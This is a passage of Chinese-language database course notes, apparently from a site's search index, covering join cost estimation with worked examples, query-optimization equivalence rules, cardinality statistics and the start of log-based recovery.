\u90fd\u6709\u5bf9\u5e94 Index\uff0c\u5219\u9009\u53d6 Tuple \u6570\u91cf\u66f4\u5c11\u7684\u4f5c\u4e3a\u5916\u5c42</p> <p>\u3010Example\u3011 \u5047\u5b9a\u6709\u8868\uff1a</p> <pre><code>Movie([title], type, director);\nComment([title, user_name], grade);\n</code></pre> <ul> <li>Number of Tuples, movie: 5,000; comment: 1,000,000;</li> <li>Blocking Factor, movie: 50; comment: 100;</li> <li>Number of Distinct Values, V(director, movie) = 500; V(grade, comment) = 5;</li> <li>Block Size: 4KB</li> <li>Movie has a B+ Tree Index on title, and each index block contains 60 entries.</li> </ul> <p>Suppose that the index nested-loop join is used to implement \\(\\sigma_{director = \"sora\"}(movie) \\bowtie comment\\), please estimate cost.(assume worst case of memory)</p> <p>\u53ea\u6709 Movie \u6709\u7d22\u5f15\uff0c\u56e0\u6b64\u53ea\u80fd\u7531\u8868 Movie \u4f5c\u4e3a\u5185\u5c42\u3002</p> <ul> <li>\u8868 comment \u7684 Blocks \u6570\u91cf\u4e3a \\(1,000,000/100=10,000\\) \u4e2a\uff1b</li> <li>B+ \u6811\u7d22\u5f15\u7684\u9ad8\u5ea6\u8ba1\u7b97\u4e3a \\(\\log_{60}(5000) = 3 \\le h \\le 3= \\log_{30}(5000)\\)</li> <li>\u56e0\u6b64\u5bf9\u5185\u5c42\u8868 Movie \u7684\u5355\u6b21\u67e5\u8be2 title\uff0c\u6240\u9700\u8981\u7684 cost \\(c=3 (Transfer+Seek)\\)</li> <li>Transfer: \\(10,000 + 1,000,000*3\\)</li> <li>Seek: \\(10,000 + 1,000,000 *3\\)</li> </ul> <p>\u53c2\u8003\u7b54\u6848\u4e2d\u5bf9 \\(n_r\\) \u9664\u4ee5 500 \u4e86\uff0c\u4f46\u6211\u89c9\u5f97\u4e0d\u5e94\u8be5</p> <p>\u3010Example\u3011 \u5047\u5b9a\u6709\u8868\uff1a</p> <pre><code>card([cno], name, depart, balance);\ndetail([cno, pno, cdate, ctime], amount, remark);\n</code></pre> <ul> <li>\\(n_{card}=10,000, \\ n_{detail}=10,000,000\\)</li> <li>\\(l_{card}=25,\\ l_{detail}=29\\) </li> <li>V(name, card) = 5000</li> <li>Block Size = 4KB</li> <li>card and detail tables are stored as sequential files based on search-key <code>cno</code>, there is a B+-Tree Index on <code>detail(cno)</code></li> </ul> <p>\u4f30\u8ba1 \\(\\sigma_{name='sora'}(card) \\bowtie detail\\) \u7684\u4ee3\u4ef7\uff0c\u5176\u4e2d \\(\\sigma\\) \u4f7f\u7528 file scan\uff0c\\(\\bowtie\\) \u4f7f\u7528 indexed-loop join\u3002</p> <p>\u505a\u8fd9\u9898\u4e0d\u8981\u8fd9\u4e48\u6b7b\u677f\uff0c\u8981\u6709\u81ea\u5df1\u7684\u601d\u8003\u3002</p> <ul> <li>card \u4e2d\uff0c\u4e00\u4e2a Block \u53ef\u4ee5\u88c5\u5165 \\(4096 / 25= 163\\) \u4e2a records\u3002\u90a3\u4e48 Blocks of card = \\(10,000 / 163=62\\)\uff1b\u540c\u7406\u5f97\u5230 detail \u7684 Block \u53ef\u4ee5\u88c5\u5165 141 \u4e2a records\u3002</li> <li>\u8ba1\u7b97\u7d22\u5f15\u76f8\u5173\u53c2\u6570<ul> <li>Fan-out Rate n = \\((4096-4) / (5+4)+1 = 455\\)</li> <li>\\(\\log_{455} (10,000) = 2 \\le height \\le 2 = \\log_{288} (10,000 / 2)+1\\)<ul> <li>\u8fd9\u91cc search-key \u6570\u91cf\u53d6\u4e86 10,000\uff0c\u56e0\u4e3a <code>cno</code> \u4e0d\u662f detail \u7684 candidate key\uff0c\u4f46\u662f\u662f card \u7684\uff0c\u5373\u8fd9\u91cc\u662f\u7a00\u758f\u7d22\u5f15</li> </ul> </li> </ul> </li> <li>\u8ba1\u7b97 \\(\\sigma\\) \u6d88\u8017<ul> <li>Transfer = \\(62t_T\\), Seek = \\(1t_S\\)</li> <li>\u6b64\u65f6\u5916\u5c42 \\(\\sigma_{name=...} (card)\\) \u4e2d\u7684\u53c2\u6570\uff1a<ul> <li>\\(n_r = 10,000 / 5,000 = 2\\)</li> </ul> </li> </ul> </li> <li>\u8ba1\u7b97 \\(\\bowtie\\) \u6d88\u8017<ul> <li>\u8fd9\u91cc\u4e0d\u80fd\u5957\u5165\u4e0a\u9762\u7684\u516c\u5f0f\uff0c\u56e0\u4e3a\u5916\u5c42\u53ea\u6709\u4e24\u4e2a Record\uff0c\u6211\u4eec\u5206\u522b\u5bf9\u5b83\u4eec\u90fd\u8fdb\u884c\u4e00\u6b21\u7d22\u5f15\u67e5\u8be2\u5373\u53ef\uff0c\u4e00\u6b21\u7d22\u5f15\u67e5\u8be2\u627e\u5230\u6240\u6709\u76f8\u540c <code>cno</code> \u7684\u6d88\u8017\u4e3a\uff1a\\(2(t_T +t_S) + t_S +8t_T\\)<ul> <li>\u8fd9\u91cc\u7684 8 \u6765\u81ea\u4e8e\u4e00\u4e2a <code>cno</code> \u5bf9\u5e94\u4e86 detail \u4e2d \\(10,000,000 / 10,000 / 141=8\\) \u4e2a Blocks</li> </ul> </li> <li>\u5916\u5c42\u603b\u5171\u67e5\u8be2\u4e24\u6b21\uff0c\u6240\u4ee5\u6d88\u8017\u4e3a \\(2 * (10t_T +3t_S)\\)</li> </ul> </li> <li>\u5c06\u4e24\u4e2a\u52a0\u8d77\u6765\uff0c\u5f97\u5230 \\(cost =7t_S +82t_T\\)</li> </ul> <p>\u8fd9\u91cc\u76f8\u5f53\u4e8e \\(c=10t_T +3t_S\\), \\(n_r =2\\)\uff1b\u5728\u6267\u884c \\(\\sigma\\) \u64cd\u4f5c\u540e\uff0c\u5916\u5c42\u7ed3\u679c\u5df2\u7ecf\u4f4d\u4e8e\u5185\u5b58\u4e2d\uff0c\u4e0d\u9700\u8981\u518d\u6b21\u53d6\u51fa\uff0c\u4e0d\u7528\u518d\u6d88\u8017 \\(b_r( t_T +t_S)\\)</p> <p>Merge Join</p> <p>\u5bf9\u4e24\u4e2a\u8868\u5206\u522b\u6309\u7167 Join Attribute \u8fdb\u884c\u6392\u5e8f\uff0c\u7136\u540e\u5f52\u5e76\u8fde\u63a5\u4e24\u4e2a\u8868\u3002\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u6bcf\u4e2a Blocks \u53ea\u9700\u8981\u8bfb\u8fdb Memory \u4e00\u6b21\uff0c\u90a3\u4e48\u5176\u6d88\u8017\u4f30\u8ba1\u4e3a\uff1a</p> <ul> <li>Block Transfers: \\(b_r+b_s\\)\u00a0+(\u6392\u5e8f)</li> <li>Seeks: \\(\\lceil b_r / b_b\\rceil+\\lceil b_s / b_b\\rceil\\)\u00a0+(\u6392\u5e8f)</li> </ul> <p>\u5176\u4e2d\uff0c\\(b_b\\) \u6307 Buffer \u4e2d\u80fd\u591f\u7f13\u5b58\u7684\u7528\u6765\u5f52\u5e76\u7684 Block \u6570\uff0c\u5373\u6bcf\u8f6e\u987a\u5e8f\u8bfb\u53d6 \\(b_b\\) \u4e2a\u5757\u8fdb\u5165\u5185\u5b58\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\u8bbe\u7f6e \\(b_b= \\frac{M}{2}\\)\uff0c\u4f46\u662f\u4e5f\u5141\u8bb8\u4e24\u4e2a\u8868\u7684 Buffer \u5927\u5c0f\u4e0d\u540c\uff0c\u4f46\u4e8c\u8005\u4e4b\u548c\u4ecd\u4e3a \\(M\\)\u3002</p> <p>\u4e0e\u5f52\u5e76\u6392\u5e8f\u7b97\u6cd5\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8e\uff0c\u9700\u8981\u5339\u914d\u76f8\u540c\u7684 Join Attribute\uff0c\u5373\u5bf9\u91cd\u590d\u503c\u7684\u5904\u7406</p> <p>Hash Join</p> <p>\u5bf9\u4e24\u4e2a\u8868\u7684 Join Attribute \u540c\u65f6\u4f7f\u7528\u54c8\u5e0c\u51fd\u6570\u5206\u7247\uff0c\u80fd\u591f Equi-Join \u7684\u6570\u636e\u4e00\u5b9a\u4f4d\u4e8e\u540c\u4e00\u4e2a Partition \u4e2d\uff0c\u4f46\u662f\u540c\u4e00\u4e2a Partition \u4e2d\u7684\u6570\u636e\u4e0d\u4e00\u5b9a\u76f8\u7b49\u3002</p> <p>\u6838\u5fc3\u601d\u60f3\u5728\u4e8e\u5927\u5173\u7cfb\u8f6c\u6362\u6210\u5c0f\u5173\u7cfb</p> <p></p> <p>\u505a\u5b8c\u54c8\u5e0c\u540e\uff0c\u4f9d\u6b21\u91cd\u590d\u8fdb\u884c\u6784\u5efa\u4e0e\u63a2\u6d4b(Build &amp; Probe)\uff1a</p> <ol> <li>\u628a\u4e00\u4e2a \\(s_i\\) \u5206\u533a\u7684\u6240\u6709\u6570\u636e\u8bfb\u5165 Memory\uff0c\u7528\u4e00\u4e2a\u65b0\u7684\u54c8\u5e0c\u51fd\u6570\u6839\u636e Join Attribute \u4e3a\u5176\u6784\u9020 Hash Index</li> <li>\u4f9d\u6b21\u8bfb\u5165\u76f8\u5e94\u7684 \\(r_i\\) \u5206\u533a\u7684\u6240\u6709\u5143\u7ec4 \\(t_r\\)\uff0c\u6839\u636e Hash Index \u627e\u5230\u5176\u5bf9\u5e94\u4f4d\u7f6e\uff0c\u5c06\u5339\u914d\u7684\u7ed3\u679c\u8f93\u51fa</li> </ol> <p>\u56e0\u6b64\uff0c\\(s\\) \u79f0\u4e3a Build Input\uff0c\\(r\\) \u79f0\u4e3a Probe Input\u3002</p> <p>\u6839\u636e\u4ee5\u4e0a\u6b65\u9aa4\uff0c\u53ef\u77e5\u6bcf\u4e2a Partition \\(s_i\\) \u7684\u5927\u5c0f\u90fd\u8981\u5c0f\u4e8e \\(M\\)\uff0c\u5bf9\u4e8e \\(r_i\\) \u5219\u65e0\u8fd9\u4e2a\u8981\u6c42</p> <p>Partition \u7684\u4e2a\u6570 \\(n\\) \u901a\u5e38\u8bbe\u7f6e\u4e3a \\(n=\\lceil \\frac{b_s}{M}* f\\rceil\\)\uff0c\\(f\\) \u79f0\u4e3a\u4fee\u6b63\u56e0\u5b50(Fudge Factor)\uff0c\u4e00\u822c\u4e3a \\(1.2\\)</p> <p>\u5982\u679c\u5185\u5b58\u653e\u4e0d\u4e0b \\(s_i\\)\uff0c\u5219\u53ef\u4ee5\u5bf9\u8d85\u5927\u5206\u533a\u518d\u505a\u591a\u6b21\u54c8\u5e0c\u5206\u533a\uff0c\u76f4\u5230\u6bcf\u4e2a\u5b50\u5206\u533a\u8db3\u591f\u5c0f\uff0c\u8fd9\u79cd\u505a\u6cd5\u79f0\u4e3a Recursive Partition\u3002\u5199\u9898\u4e2d\uff0c\u53ea\u8981 \\(M &gt; n_h +1\\)\uff0c\u5c31\u4e0d\u4f1a\u53d1\u751f Recursive Partition\u3002</p> <p></p> <ul> <li>\\(n_h \\ge \\lceil b_s / M\\rceil\\)<ul> <li>\u7c97\u7565\u4f30\u7b97\u5206\u533a\u7684\u6570\u91cf\uff0c\\(n_h\\) \u662f\u4ece 0 \u5f00\u59cb\u8ba1\u6570\u7684\uff0c\u6240\u4ee5\u5206\u533a\u6570\u91cf\u5b9e\u9645\u4e3a \\(n_h+1\\)<ul> <li>\u4e0d\u8fc7\u6211\u770b\u65e0\u8bba\u662f\u8003\u8bd5\u8fd8\u662f\u8bfe\u672c\u90fd\u6ca1\u6709\u523b\u610f\u5728\u610f\u8fd9\u4e2a\u70b9</li> </ul> </li> <li>\u8981\u60f3\u4e0d\u53d1\u751f Recursive Partition\uff0c\u8fd8\u9700\u8981\u6ee1\u8db3 \\(M \\gt n_h +1\\)\uff0c\u8fd9\u4e5f\u7b49\u4ef7\u4e8e \\(M\\gt (b_s / M) +1\\)</li> </ul> </li> <li>\\(b_b = \\lfloor M / (n_h +1) \\rfloor\\)<ul> <li>\u7559\u4e00\u5757\u7f13\u51b2\u533a\u7528\u4e8e\u8f93\u5165\u8f93\u51fa</li> </ul> </li> </ul> \u8fd9\u91cc\u9898\u76ee\u8bf4\u4e86\u5ffd\u7565 Writing Partially Filled Blocks\uff0c\u6240\u4ee5\u867d\u7136\u6709 \\(n_h=5\\)\uff0c\u8ba1\u7b97\u4e2d\u4e5f\u4e0d\u7528\u52a0\u4e0a <p></p>"},{"location":"Courses/DB/Query%20Processing/#query-optimization","title":"Query Optimization","text":"<p>Optimizer \u505a\u4ec0\u4e48\uff1f</p> <ol> <li>\u5e94\u7528\u7b49\u4ef7\u53d8\u6362</li> <li>\u751f\u6210\u591a\u79cd\u7b49\u4ef7\u6267\u884c\u8ba1\u5212</li> <li>\u4f7f\u7528\u9759\u6001\u7b56\u7565\u8bc4\u4f30\u5404\u4e2a\u8ba1\u5212\u7684 Cost</li> <li>\u9009\u62e9\u6700\u6709\u6548\u7387\u7684\u6267\u884c\u8ba1\u5212</li> </ol> <p>\u4e24\u4e2a\u65b9\u9762\uff1a</p> <ul> <li>&lt;1&gt; \u903b\u8f91\u4ee3\u6570\u5c42\u9762<ul> <li>\u627e\u5230\u7b49\u4ef7\u4e14\u66f4 efficient \u7684\u903b\u8f91\u4ee3\u6570</li> </ul> </li> <li>&lt;2&gt; \u6267\u884c\u5c42\u9762<ul> <li>\u4f7f\u7528\u4ec0\u4e48\u7b97\u6cd5\u6267\u884c\uff1f</li> </ul> </li> </ul> <p>\u56e0\u6b64\u6700\u540e\u751f\u6210\u7684 Execution Plan \u51b3\u5b9a\u4e86 Operation \u7684\u6392\u5217\u4ee5\u53ca\u5176\u4f7f\u7528\u7684\u5177\u4f53\u7b97\u6cd5\uff0c\u4e00\u4e2a\u793a\u4f8b\u5982\u4e0b\uff1a</p> <p></p> <p>\u7ed9\u5b9a\u4e00\u4e2a Query Expression \u6811\uff0c\u6211\u4eec\u4ece\u5e95\u5411\u4e0a\u6267\u884c</p>"},{"location":"Courses/DB/Query%20Processing/#transformation","title":"Transformation","text":"<p>\u3010Rule 1\u3011 Conjunctive =&gt; Individual</p> \\[\\sigma_{ \\theta_1\\land \\theta_2}(E)=\\sigma_{ \\theta_1}( \\sigma_{ \\theta_2}(E))\\] Example <p></p> <p>\u3010Rule 2\u3011 Commutative Selection</p> \\[\\sigma_{ \\theta_1}( \\sigma_{ \\theta_2}(E)) = \\sigma_{ \\theta_2}( \\sigma_{ \\theta_1}(E))\\] <p>\u3010Rule 3\u3011 Only Final Projection</p> \\[\\Pi_{ L_1}(\\Pi_ {L_2} (...(\\Pi_ {L_n} (E)))) = \\Pi_{ L_1}(E)\\] <p>\u3010Rule 4\u3011 Cartesian Products =&gt; Theta Join</p> \\[\\begin{array}l a. &amp; \\sigma_{\\theta} (E_1 \\times E_2) = E_1 \\bowtie_\\theta E_2 \\\\ b. &amp; \\sigma_{\\theta _1} (E_1 \\bowtie_{ \\theta_2} E_2) = E_1 \\bowtie_{ \\theta_1 \\land \\theta_2} E_2\\end{array}\\] <p>\u3010Rule 5\u3011 Commutative Theta Join</p> \\[E_1 \\bowtie_\\theta E_2 =E_2 \\bowtie_\\theta E_1\\] <p>\u3010Rule 6\u3011 Assoiative Natural Join</p> \\[(E_1 \\bowtie E_2) \\bowtie E_3 = E_1 \\bowtie (E_2 \\bowtie E_3)\\] <p>\u3010Rule 7\u3011 Selection Distributes Join</p> <ul> <li>&lt;7.a&gt; \u5982\u679c \\(\\theta_1\\) \u53ea\u5305\u542b Expression \\(E_1\\) \u4e2d\u7684\u5c5e\u6027<ul> <li>\\(\\sigma_{\\theta _1} (E_1 \\bowtie_\\theta E_2) = (\\sigma_{\\theta _1}(E_1)) \\bowtie_\\theta E_2\\)</li> </ul> </li> <li>&lt;7.b&gt; \\(\\theta_1, \\theta_2\\) \u5206\u522b\u53ea\u5305\u542b \\(E_1, E_2\\) \u4e2d\u7684\u5c5e\u6027<ul> <li>\\(\\sigma_{\\theta _1\\land \\theta_2} (E_1 \\bowtie_\\theta E_2) = (\\sigma_{\\theta _1}(E_1)) \\bowtie_\\theta (\\sigma_{\\theta _2} (E_2))\\)</li> </ul> </li> </ul> Example <p></p> <p>\u3010Rule 8\u3011 Projection Distributes Join</p> <p>\u5982\u679c\u6761\u4ef6 \\(\\theta\\) \u53ea\u5305\u542b \\(L_1 \\cup L_2\\) \u4e2d\u7684\u5c5e\u6027\uff1a</p> \\[\\Pi_{ L_1\\cup L_2} (E_1 \\bowtie_\\theta E_2) = (\\Pi_{ L_1}(E_1)) \\bowtie_\\theta (\\Pi_{ L_2} (E_2))\\] <p>\u3010Rule 9\u3011 Commutative Set Operation</p> \\[\\begin{array}l E_1 \\cup E_2 = E_2 \\cup E_1 \\\\ E_1 \\cap E_2 = E_2 \\cap E_1\\end{array}\\] <p>\u3010Rule 10\u3011 Associative Set Operation</p> \\[\\begin{array}l (E_1 \\cup E_2)\\cup E_3 = E_1 \\cup (E_2 \\cup E_3) \\\\ (E_1 \\cap E_2) \\cap E_3 = E_1 \\cap (E_2 \\cap E_3)\\end{array}\\] <p>\u3010Rule 11\u3011 Selection Distributes Set Operation</p> <ul> <li>&lt;1&gt; \\(\\sigma_\\theta (E_1 \\cup E_2) = \\sigma_\\theta (E_1) \\cup \\sigma_\\theta (E_2)\\)</li> <li>&lt;2&gt; \\(\\sigma_\\theta (E_1 \\cap E_2) = \\sigma_\\theta (E_1) \\cap \\sigma_\\theta (E_2)\\)</li> <li>&lt;3&gt; \\(\\sigma_\\theta (E_1 - E_2) =\\sigma_\\theta (E_1)-\\sigma _\\theta (E_2)\\)</li> <li>&lt;4&gt; \\(\\sigma_\\theta (E_1 \\cap E_2) = \\sigma_\\theta (E_1) \\cap E_2\\)</li> <li>&lt;5&gt; \\(\\sigma_\\theta (E_1 - E_2) =\\sigma_\\theta (E_1)- E_2\\)</li> </ul>"},{"location":"Courses/DB/Query%20Processing/#statistics-for-cost-estimation","title":"Statistics for Cost Estimation","text":"<p>\u9759\u6001\u4f30\u8ba1\u7b56\u7565\u53ef\u80fd\u4e0d\u51c6\u786e\uff0c\u4f46\u662f\u7ed3\u679c\u76f8\u5dee\u4e0d\u4f1a\u592a\u5927\u3002\u4e00\u4e2a Lowest Estimated Execution \u4e5f\u53ef\u80fd\u4e0d\u662f Lowest Actual Execution\u3002</p> <ul> <li>\\(n_r\\): \u5173\u7cfb \\(r\\) \u7684 tuple \u4e2a\u6570</li> <li>\\(b_r\\): \u5173\u7cfb \\(r\\) \u7684 Block \u4e2a\u6570</li> <li>\\(l_r\\): \u5173\u7cfb \\(r\\) \u7684\u4e00\u4e2a tuple \u7684\u5927\u5c0f(size)</li> <li>\\(f_r\\): \u5173\u7cfb \\(r\\) \u4e2d\uff0c\u4e00\u4e2a Block \u4e2d tuple \u7684\u4e2a\u6570<ul> <li>\u901a\u5e38 \\(b_r = \\lceil \\frac{n_r}{f_r} \\rceil\\)</li> </ul> </li> <li>\\(V(A,r)\\): \u5173\u7cfb \\(r\\) \u7684\u5c5e\u6027 \\(A\\) \u4e2d Distinct Values \u7684\u4e2a\u6570<ul> <li>\u7b49\u4ef7\u4e8e \\(\\Pi_A(r)\\) \u7684\u5927\u5c0f</li> </ul> </li> </ul> <p>\u6211\u4eec\u9996\u5148\u4f30\u8ba1\u4e0d\u540c\u64cd\u4f5c\u8f93\u51fa\u7ed3\u679c\u7684 Tuple \u4e2a\u6570\uff1a</p> <ul> <li>&lt;1&gt; \\(\\sigma_{A=V} (r)\\)<ul> <li>\\(n_r / V(A,r)\\)</li> <li>\u5982\u679c \\(A\\) \u662f Key Attribute\uff0c\u5219\u4e3a \\(1\\)</li> </ul> </li> <li>&lt;2&gt; \\(\\sigma_{A\\le V} (r)\\)<ul> <li>\\(n_r \\times \\frac{V -min(A,r)}{max(A,r) -min(A,r)}\\)</li> <li>\u5982\u679c \\(V \\le min(A,r)\\)\uff0c\u5219\u4e3a \\(0\\)</li> </ul> </li> <li>&lt;3&gt; \\(\\sigma_{ \\theta_1 \\land \\theta_2\\land ...\\land \\theta_n}(r)\\)<ul> <li>\\(n_r \\times \\frac{s_1 \\times s_2 \\times ...\\times s_n}{ n_r^n}\\)</li> <li>\u5176\u4e2d \\(s_i\\) \u6307\u7684\u662f \\(\\theta_i\\) \u7684\u4f30\u8ba1\u8f93\u51fa\u6570\u91cf</li> <li>\u8be5\u516c\u5f0f\u7684\u524d\u63d0\u662f \\(\\theta_i\\) \u4e4b\u95f4\u76f8\u4e92\u72ec\u7acb</li> </ul> </li> <li>&lt;4&gt; \\(\\sigma_{ \\theta_1 \\lor \\theta_2\\lor ...\\lor \\theta_n}(r)\\)<ul> <li>\\(n_r \\left ( 1- (1- \\frac{s_1}{n_r})(1- \\frac{s_2}{n_r})...(1- \\frac{s_n}{n_r}) \\right)\\)</li> </ul> </li> <li>&lt;5&gt; \\(R\\bowtie S\\)<ul> <li>\u5982\u679c \\(R\\cap S =\\emptyset\\)\uff0c\u5219\u7b49\u4ef7\u4e8e \\(R\\times S\\)</li> <li>\u5982\u679c \\(R\\cap S= \\{A\\}\\) \u4e3a \\(R\\) \u7684 Candidate Key\uff0c\u5219\u5c0f\u4e8e\u7b49\u4e8e\u5173\u7cfb \\(S\\) \u7684 Tuple \u4e2a\u6570 \\(n_s\\)<ul> <li>\u5373 \\(t_s\\) \u5bf9\u5e94 0 \u6216 1 \u4e2a \\(t_r\\)</li> </ul> </li> <li>\u5982\u679c \\(R\\cap S=\\{A\\}\\) \u4e0d\u4e3a\u4e8c\u8005\u7684 Key\uff0c\u5219\u4f30\u8ba1\u4e3a \\(\\min \\left(\\frac{n_r \\times n_s}{V(A,r)}, \\frac{n_r \\times n_s}{V(A,s)}\\right)\\)</li> </ul> </li> <li>&lt;6&gt; \\(\\Pi_A(r)\\)<ul> <li>\\(V(A,r)\\)</li> </ul> </li> <li>&lt;7&gt; \\(_Ag_F(r)\\)<ul> <li>\\(V(A, r)\\)</li> </ul> </li> <li>&lt;8&gt; Outer Join<ul> <li>\u4f30\u8ba1\u4e3a\u81ea\u7136\u8fde\u63a5\u7684\u7ed3\u679c\u52a0\u4e0a Outer \u65b9\u7684\u5927\u5c0f</li> <li>\u4f8b\u5982 size of (r \u27d7 s) = size of (r \u22c8 s) + size of r + size of s</li> </ul> </li> <li>&lt;9&gt; Set Operations<ul> <li>size of \\(r \\cup s\\) = size of r + size of s</li> <li>size of \\(r\\cap s\\) = min (size of r + size of s)</li> <li>size of \\(r-s\\) = size of r</li> <li>\u4e0a\u8ff0\u4e09\u4e2a\u90fd\u662f\u6309\u7167\u4e0a\u9650\u4f30\u8ba1</li> </ul> </li> </ul> \u4f8b\u9898 \u9898\u9762\u89e3\u7b54 <p></p> <p></p>"},{"location":"Courses/DB/Recovery%20System/","title":"Recovery System","text":""},{"location":"Courses/DB/Recovery%20System/#recovery-system","title":"Recovery System","text":"<p> \u7ea6 2416 \u4e2a\u5b57  19 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p> <p>Failure Classification</p> <ul> <li>Transaction Failure<ul> <li>Logical Errors: \u4e8b\u52a1\u56e0\u5185\u90e8\u9519\u8bef\u65e0\u6cd5\u5b8c\u6210<ul> <li>Overflow, bad input, data not found</li> </ul> </li> <li>System Errors: DBMS \u5fc5\u987b\u7ec8\u6b62\u4e00\u4e2a\u6b63\u5728\u6d3b\u8dc3\u7684\u4e8b\u52a1<ul> <li>Deadlock</li> </ul> </li> </ul> </li> <li>System Crash<ul> <li>Power Failure, Hardware Failure, Software Failure</li> </ul> </li> <li>Disk Failure<ul> <li>\u78c1\u76d8\u5b58\u50a8\u635f\u574f</li> </ul> </li> </ul>"},{"location":"Courses/DB/Recovery%20System/#log-based-recovery","title":"Log-Based Recovery","text":"<p>Log \u7531\u4e00\u7cfb\u5217 Log Records \u7ec4\u6210\uff0c\u7ef4\u62a4\u5728\u7a33\u5b9a\u5b58\u50a8\u4e2d:</p> <ul> <li>\u5f53\u4e8b\u52a1 \\(T_i\\) \u5f00\u59cb\u65f6\uff0c\u5199\u5165\u8bb0\u5f55 <code>&lt;T_i, start&gt;</code></li> <li>\u5728\u4e8b\u52a1 \\(T_i\\) \u6267\u884c <code>WRITE(X)</code> \u524d\uff0c\u5199\u5165\u8bb0\u5f55 <code>&lt;T_i, X, V_1, V_2&gt;</code><ul> <li>\u5176\u4e2d <code>V_1</code>, <code>V_2</code> \u5206\u522b\u662f\u6570\u636e\u9879 <code>X</code> \u5199\u5165\u524d\u540e\u7684\u503c</li> </ul> </li> <li>\u5f53\u4e8b\u52a1 \\(T_i\\) \u7ed3\u675f\u65f6\uff0c\u5199\u5165\u8bb0\u5f55 <code>&lt;T_i, commit&gt;</code></li> </ul> <p>\u8fd9\u79cd\u8bb0\u5f55\u524d\u540e\u503c\u7684\u65b9\u5f0f\u79f0\u4e3a\u7269\u7406\u65e5\u5fd7\uff0c\u903b\u8f91\u65e5\u5fd7\u5219\u8bb0\u5f55\u503c\u7684\u53d8\u5316\uff0c\u5982 <code>+100</code>\uff0c\u5176\u9897\u7c92\u5ea6\u66f4\u5c0f</p>"},{"location":"Courses/DB/Recovery%20System/#deffered-database-modification","title":"Deffered Database Modification","text":"<p>Deffered Database Modification \u5c06\u6240\u6709\u5199\u64cd\u4f5c\u90fd\u63a8\u8fdf\u5230 Partial Commit \u9636\u6bb5\uff0c\u5373\u4e8b\u52a1\u6267\u884c\u8fc7\u7a0b\u4e2d\u53ea\u8bb0\u5f55 Log\uff1b\u4e8b\u52a1 Commit \u540e\u518d\u8bfb Log \u5e76\u5c06\u9700\u8981\u5199\u5165\u7684\u5185\u5bb9\u6267\u884c\u3002</p> <p>\u5047\u5b9a DB Crash \u65f6\uff0c\u5b58\u50a8\u5728 Stable Storage \u4e2d\u7684 Log \u5206\u522b\u4e3a\u5982\u4e0b\u4e09\u79cd\u60c5\u51b5\uff1a</p> <p></p> <ul> <li>\u3010a\u3011 \u4e0d\u9700\u8981\u505a <code>REDO</code> \u64cd\u4f5c\uff0c\u56e0\u4e3a\u6ca1\u6709\u4efb\u4f55\u6570\u636e\u88ab\u5b9e\u9645\u5199\u5165</li> <li>\u3010b\u3011 \u9700\u8981 <code>REDO(T_0)</code>\uff0c\u56e0\u4e3a \\(T_0\\) \u5df2\u7ecf <code>COMMIT</code> \u4e86\uff0c\u4f46\u5b83\u7684\u6570\u636e\u8fd8\u6ca1\u6210\u529f\u5199\u5165</li> <li>\u3010c\u3011 \u9700\u8981 <code>REDO(T_0), REDO(T_1)</code></li> </ul>"},{"location":"Courses/DB/Recovery%20System/#immediate-database-modification","title":"Immediate Database Modification","text":"<p>Immediate Modification \u5141\u8bb8\u4e8b\u52a1\u5728\u672a\u63d0\u4ea4\u4e4b\u524d\u5c31\u5c06\u66f4\u65b0\u5199\u5165 Buffer \u6216\u8005 Disk \u4e2d\uff0c\u4f46\u662f\u4ecd\u7136\u9700\u8981\u6ce8\u610f Log Record \u7684\u5199\u5165\u5fc5\u987b\u5728\u6570\u636e\u9879\u7684\u5199\u5165\u4e4b\u524d\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u6682\u65f6\u5047\u8bbe Log Record \u662f\u76f4\u63a5\u5199\u5165 Stable Storage \u4e2d\u7684</p> <p>\u7531\u4e8e\u5c06\u66f4\u65b0\u540e\u7684 Block \u5199\u56de\u78c1\u76d8\u76f8\u5bf9\u8017\u65f6\uff0c\u5b83\u4eec\u7684\u5b9e\u9645\u5199\u5165\u65f6\u95f4\u53ef\u80fd\u51fa\u73b0\u5728\u8be5\u4e8b\u52a1 <code>COMMIT</code> \u4e4b\u540e\uff0c\u4f8b\u5982\uff1a</p> <p></p> <p>\u5728\u5982\u4e0a\u80cc\u666f\u4e0b\uff0c\u6211\u4eec\u5c06\u6570\u636e\u5e93\u7684\u6062\u590d\u5206\u4e3a\u4e24\u4e2a\u64cd\u4f5c\uff1a</p> <ul> <li>\u3010Undo\u3011 \u4ece\u4e8b\u52a1 \\(T_i\\) \u7684\u6700\u540e\u4e00\u4e2a\u8bb0\u5f55\u5f00\u59cb\uff0c\u5c06\u5bf9\u5e94\u6570\u636e\u9879\u7684\u503c\u90fd\u6062\u590d\u5230 old values<ul> <li>\u5982\u679c\u8bb0\u5f55\u53ea\u5305\u542b <code>&lt;T_i, start&gt;</code> \u4e0d\u5305\u542b <code>&lt;T_i, commit&gt;</code></li> <li>Undo \u65f6\uff0c\u4e5f\u8981\u8bb0\u5f55\u5bf9\u5e94\u7684\u65e5\u5fd7</li> </ul> </li> <li>\u3010Redo\u3011 \u4ece\u4e8b\u52a1 \\(T_i\\) \u7684\u7b2c\u4e00\u4e2a\u8bb0\u5f55\u5f00\u59cb\uff0c\u5c06\u5bf9\u5e94\u6570\u636e\u9879\u7684\u503c\u90fd\u8bbe\u7f6e\u4e3a new values<ul> <li>\u5982\u679c\u8bb0\u5f55\u65e2\u5305\u542b <code>&lt;T_i, start&gt;</code> \u53c8\u5305\u542b <code>&lt;T_i, commit&gt;</code></li> </ul> </li> </ul> <p>\u7531\u4e8e\u540c\u4e00\u4e2a operation \u5728\u6062\u590d\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u6267\u884c\u591a\u6b21\uff0c\u5b83\u4eec\u90fd\u9700\u4fdd\u8bc1\u662f idempotent \u7684</p> <p>\u5373\u5e42\u7b49\uff0c\u65e0\u8bba\u6267\u884c\u540c\u4e00\u64cd\u4f5c\u591a\u5c11\u6b21\uff0c\u6700\u540e\u7684\u6548\u679c\u548c\u53ea\u6267\u884c\u4e00\u6b21\u76f8\u540c\u3002</p> <p></p> <p>\u5148 REDO \u518d UNDO</p> <p>\u5728\u6570\u636e\u5e93\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f1a\u8bbe\u7f6e 